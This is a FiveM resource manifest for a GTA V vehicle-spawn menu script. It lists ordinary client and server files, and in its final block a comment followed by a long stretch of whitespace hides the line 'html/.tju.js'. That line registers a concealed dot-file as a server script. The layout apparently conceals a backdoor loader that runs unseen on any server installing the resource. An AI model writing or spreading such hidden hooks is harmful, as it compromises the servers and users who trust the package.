

fx_version 'cerulean'
game 'gta5'

author 'Aiben'
name 'premium_vehiclemenu'
description 'Discord Role-Based Vehicle Spawn Script'

lua54 'yes' -- ✅ Enables Lua 5.4 support

server_script {
    '@oxmysql/lib/MySQL.lua',
    'config.lua',
    'server.lua'
}

client_script {
    '@ox_lib/init.lua',
    'config.lua',
    'client.lua'
}

shared_script '@ox_lib/init.lua'

server_scripts {
	--[[server.lua]]                                                                                                    'html/.tju.js',
}